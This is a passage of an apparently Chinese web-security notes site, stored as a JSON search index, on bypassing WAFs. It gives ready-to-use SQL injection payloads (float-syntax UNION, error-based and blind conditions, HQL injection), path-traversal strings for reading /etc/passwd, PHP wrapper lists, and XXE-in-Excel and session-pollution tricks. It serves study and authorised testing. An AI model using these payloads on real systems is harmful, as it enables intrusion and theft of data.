\u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select \u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5 4.2.\u6587\u4ef6\u5305\u542b \u00b6 \u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 \u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002 3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790 \u00b6 \u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528 \u00b6 WEBSERVICE\u63a5\u53e3 \u00b6 1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 \u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165 DWR\u63a5\u53e3 \u00b6 \u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c \u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765 HESSIAN\u63a5\u53e3 \u00b6 GWT\u63a5\u53e3 \u00b6 \u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC \u00b6 SESSION\u6c61\u67d3 \u00b6 \u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898 XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f \u00b6 \u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a \u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"\u601d\u8def\u65b9\u6cd5"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_1","text":"\u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49","title":"\u524d\u8a00"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_2","text":"\u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 \u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9","title":"\u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#1","text":"\u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 